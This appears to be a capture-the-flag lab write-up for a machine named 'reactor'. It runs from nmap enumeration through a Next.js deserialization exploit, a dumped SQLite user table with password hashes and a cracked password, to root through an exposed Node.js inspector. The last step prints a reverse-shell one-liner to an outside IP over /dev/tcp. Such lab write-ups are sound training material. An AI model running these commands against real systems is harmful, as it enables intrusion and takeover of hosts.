# Enumeration

The first thing I always do is run `nmap`

```
sudo nmap -sC -sV -vv -oA reactor 10.129.174.215
```

Output:
```
Nmap scan report for 10.129.174.215
Host is up, received echo-reply ttl 63 (0.22s latency).
Scanned at 2026-05-28 11:17:17 EDT for 41s
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIoh32XcLYi0Kdad12SajqVyUVXfkDPaB7zZCDCMIJc+fv8JUJwyQRoqX/91+p6uD75Ggdp4VNzA7WasIkyo/4U=
|   256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPws9RyzoCW2cXzOFxeZCCt8rWcNu2umX2kqLLK6T+7H
3000/tcp open  ppp?    syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000, 
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Thu, 28 May 2026 15:17:32 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Thu, 28 May 2026 15:17:34 GMT
|     Connection: close
|   Help, NCP, RPCCheck: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.99%I=7%D=5/28%Time=6A185C8C%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,247A,"HTTP/1\.1\x20200\x20OK\r\nVary:\x20RSC,\x20Next-Router-S
SF:tate-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch,\x2
SF:0Accept-Encoding\r\nx-nextjs-cache:\x20HIT\r\nx-nextjs-prerender:\x201\
SF:r\nx-nextjs-stale-time:\x204294967294\r\nX-Powered-By:\x20Next\.js\r\nC
SF:ache-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\"p02u6gnhufd8t\"\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2017
SF:175\r\nDate:\x20Thu,\x2028\x20May\x202026\x2015:17:32\x20GMT\r\nConnect
SF:ion:\x20close\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"><head><meta
SF:\x20charSet=\"utf-8\"/><meta\x20name=\"viewport\"\x20content=\"width=de
SF:vice-width,\x20initial-scale=1\"/><link\x20rel=\"stylesheet\"\x20href=\
SF:"/_next/static/css/414e1be982bc8557\.css\"\x20data-precedence=\"next\"/
SF:><link\x20rel=\"preload\"\x20as=\"script\"\x20fetchPriority=\"low\"\x20
SF:href=\"/_next/static/chunks/webpack-db0a529a99835594\.js\"/><script\x20
SF:src=\"/_next/static/chunks/4bd1b696-80bcaf75e1b4285e\.js\"\x20async=\"\
SF:"></script><script\x20src=\"/_next/static/chunks/517-d083b552e04dead1\.
SF:js\"\x20async=\"\"></script><script\x20s")%r(Help,2F,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(NCP,2F,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptio
SF:ns,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RSC,\x20Next-Rou
SF:ter-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetc
SF:h\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20private,\x20n
SF:o-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nDate:\x20Thu,
SF:\x2028\x20May\x202026\x2015:17:34\x20GMT\r\nConnection:\x20close\r\n\r\
SF:n")%r(RTSPRequest,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20R
SF:SC,\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-
SF:Segment-Prefetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x
SF:20private,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r
SF:\nDate:\x20Thu,\x2028\x20May\x202026\x2015:17:34\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 28 11:17:58 2026 -- 1 IP address (1 host up) scanned in 41.82 seconds
```

We have 2 ports open
Port 22, which is SSH and the banner tells us its an Ubuntu server
Port 3000, which is running `ppp`

`ppp` is `point-to-point` protocol. It is a data link layer networking protocol used to establish a direct connection between 2 nodes.

Open opening `http://reactor.htb:3000`, there is a static web page.
I did all the vhost and directory fuzzing and there is no other subdomain or website directory which turned up.

My wappalyzer tells me that this website is running Next.js 15.0.3
![[Pasted image 20260529203801.png]]

This version of Next.js was vulnerable to a famous CVE called React2Shell

```
Applications built with React Server Components (RSC) process data without first checking to ensure it is safe to do so. This could allow a threat actor to deliver data to the system that, once processed, executes malicious programs, allows unauthorized access, or even causes a denial of service. In cybersecurity terms, this is known as "unsafe deserialization of attacker-controlled payloads."
```

This vulnerability was caused due to unsafe deserialization which allowed attackers to inject malicious payload into the web request which would gain them command execution.

# Foothold

https://github.com/zr0n/react2shell
I used this payload on github in order to gain a shell on the webserver

I was logged in as a user `node`.
Upon further enumeration I found there was another user in this box called `engineer` which had the user flag

When I gained foothold as `node` user, I was in the directory `/opt/reactor-app` which had the whole website source code. I downloaded the whole directory and attempted to look through it for any credentials
There was a file named `reactor.db`, for which I used `sqlite3` to look into.
I opened it on my local machine and did the following command

```
sqlite3 reactor.db .dump
```

This dumped the whole database:
```
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL,
    email TEXT
);
INSERT INTO users VALUES(1,'admin','a203b22191d744a4e70ada5c101b17b8','administrator','admin@reactor.htb');
INSERT INTO users VALUES(2,'engineer','39d97110eafe2a9a68639812cd271e8e','operator','engineer@reactor.htb');
CREATE TABLE sensor_logs (
    id INTEGER PRIMARY KEY,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    sensor_id TEXT,
    reading REAL,
    status TEXT
);
INSERT INTO sensor_logs VALUES(1,'2025-12-28 14:32:01','CORE_TEMP_01',324.5,'NOMINAL');
INSERT INTO sensor_logs VALUES(2,'2025-12-28 14:32:01','PRESSURE_01',155.199999999999988,'NOMINAL');
INSERT INTO sensor_logs VALUES(3,'2025-12-28 14:32:01','COOLANT_FLOW',18.3999999999999985,'CAUTION');
COMMIT;
```

I got the password hash of `administrator@reactor.htb` and `engineer@reactor.htb`.
I was able to crack `engineer's` hash and the password was `reactor1`.
I logged into SSH as engineer and got the user flag.

# Privilege Escalation

I did not get any interesting output from linpeas. 
I ran `netstat -tulnp` and found all the open ports:
```
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:9229          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::3000                 :::*                    LISTEN      -                   
udp        0      0 127.0.0.54:53           0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           - 
```

Port 9229 was open.
```
Port 9229 is the default TCP port used by the Node.js V8 Inspector for debugging applications.
```

I ran `ps aux` to see if I could find any process owned by root
```
root        1416  0.0  1.0 1066096 42348 ?       Ssl  15:04   0:00 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

Root was running a debugging session for node.js

After a bit of research I found that if I port forward using SSH, I would get access to port 9229
```
ssh -L 9229:localhost:9229 engineer@reactor.htb
```

![[Pasted image 20260529205008.png]]

I'm supposed to interact with it as a websocket
I went into chromium web browser, opened `chrome://inspect`, then switched on remote debugging

![[Pasted image 20260529205121.png]]

I opened the debugging window, went into console and pasted the following command:
```
process.mainModule.require("child_process").execSync("bash -c 'bash -i >& /dev/tcp/10.10.16.46/9001 0>&1 &'")
```
And then I got root shell in port 9001


